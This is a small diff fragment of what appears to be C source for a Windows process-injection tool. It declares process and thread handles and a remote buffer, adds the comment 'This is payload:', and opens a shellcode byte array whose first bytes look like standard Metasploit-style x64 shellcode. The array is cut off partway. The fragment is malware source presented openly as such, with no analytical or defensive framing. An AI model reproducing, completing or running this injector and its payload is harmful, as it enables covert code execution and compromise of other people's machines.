@@ -8,7 +8,7 @@ const char* e = "[+]";
 DWORD PID, TID = NULL;
 LPVOID rBuffer = NULL;
 HANDLE hProcess, hThread = INVALID_HANDLE_VALUE;
-
+/*This is payload: */
 unsigned char sizeBuffer[] = 
 "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
 "\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x56\x48\x8b\x52"
